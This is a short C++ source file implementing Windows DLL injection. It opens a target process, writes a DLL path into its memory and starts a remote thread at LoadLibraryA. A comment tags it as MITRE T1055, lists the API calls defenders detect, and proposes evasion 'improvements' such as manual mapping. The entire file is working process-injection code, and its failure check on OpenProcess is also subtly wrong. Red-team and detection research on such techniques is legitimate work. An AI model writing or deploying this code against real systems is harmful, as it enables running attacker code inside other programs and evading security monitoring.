#include <Windows.h>
#include <string>
#include <iostream>
#include "mem.h"
/*
* TTP:
*   MITRE T1055: https://attack.mitre.org/techniques/T1055/001/
* Details:
*   This function will allocate memory in the target process, write the path to a DLL into 
*   That memory segment and call loadlibrary to gain an execution thread in the context of the injected process
* Potential Detections:
*   OpenProcess
*   WriteProcessMemory
*   CreateRemoteThread + LoadLibraryA
* Improvements:
*   Manual mapping of the DLL
*   Homegrown LoadLibraryA methods
*/
int InjectDLL(DWORD pid, std::string dll_path)
{
	std::cout << "[*] Injecting: " << dll_path << " Into Process: " << pid << std::endl;

    BOOL success = FALSE;
    //Open the process with read write permissions
    HANDLE h_proc = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);

    if (h_proc != INVALID_HANDLE_VALUE)
    {
        //Allocate memory in external process, for MAX_PATH + 1 for the null terminator and commit/reserve the memory
        //We don't need execute permissions because we are just injecting the PATH to the DLL in memory not executing
        //We need path in memory so that a remote thread can call LoadLibraryA for a location I.E. the path we just wrote to memory
        //Location cannot be 0
        void* loc = VirtualAllocEx(h_proc, 0, MAX_PATH, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (loc)
        {
            //If you are using strings you must use .c_str() to pass a null terminated c-style string to the windows API call
            success = WriteProcessMemory(h_proc, loc, dll_path.c_str(), dll_path.length() + 1, 0);
        }

        if (success)
        {
            //opens thread and calls load library on the path we just wrote into memory
            HANDLE h_thread = CreateRemoteThread(h_proc, 0, 0, (LPTHREAD_START_ROUTINE)LoadLibraryA, loc, 0, 0);

            //Clean up since our DLL is now executing
            if (h_thread)
            {
                CloseHandle(h_thread);
            }
        }
    }

    //Close our handle to the process
    if (h_proc)
    {
        CloseHandle(h_proc);
    }

	return 0;
}